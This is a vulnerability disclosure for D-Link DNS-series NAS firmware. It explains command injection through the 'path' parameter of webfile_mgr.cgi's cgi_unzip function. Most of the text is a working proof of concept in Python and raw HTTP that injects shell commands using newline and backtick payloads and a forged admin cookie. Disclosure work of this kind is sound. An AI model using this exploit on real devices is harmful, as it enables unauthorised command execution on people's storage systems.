# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)
# Affected version
DLINK DNS-320/320L/321/323/325/327L all versions of the firmware
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_unzip function of the file /cgi-bin/webfile_mgr.cgi.  The variable `path`is passed from a POST request and is assigned to `s` via the `sprintf` function at line 18 and invoked by the `popen` command, the fix_path_special_char function did not work which leads to command execution. 
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723730444351-07c8c554-729a-4a7e-beb6-fc2417fb82a9.png#averageHue=%23fefefd&clientId=u7743dfdf-be58-4&from=paste&height=113&id=u3e08daef&originHeight=176&originWidth=601&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20648&status=done&style=none&taskId=u208d9523-e3eb-4591-88ef-a15f609dd94&title=&width=387)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723730628254-2de9898f-8af1-40d9-9f6c-d70222007b9b.png#averageHue=%23fefdf9&clientId=u7743dfdf-be58-4&from=paste&height=199&id=u50dac292&originHeight=199&originWidth=844&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28116&status=done&style=none&taskId=udd8a2532-a18f-4209-aa95-9a29aeea642&title=&width=844)
# POC
```python
import requests

url = "http://192.168.0.32/cgi-bin/webfile_mgr.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_unzip&path=%0atouch%09/tmp/121%0a&name=`touch%09/tmp/121`"
response = requests.post(url, headers=headers, data=data)
print(response.text)

```

```
POST /cgi-bin/webfile_mgr.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 110
Origin: http://192.168.0.32
Connection: close
Cookie: username=admin
Priority: u=1

cmd=cgi_unzip&path=%0atouch%09/tmp/121%0a&name=`touch%09/tmp/121`
```


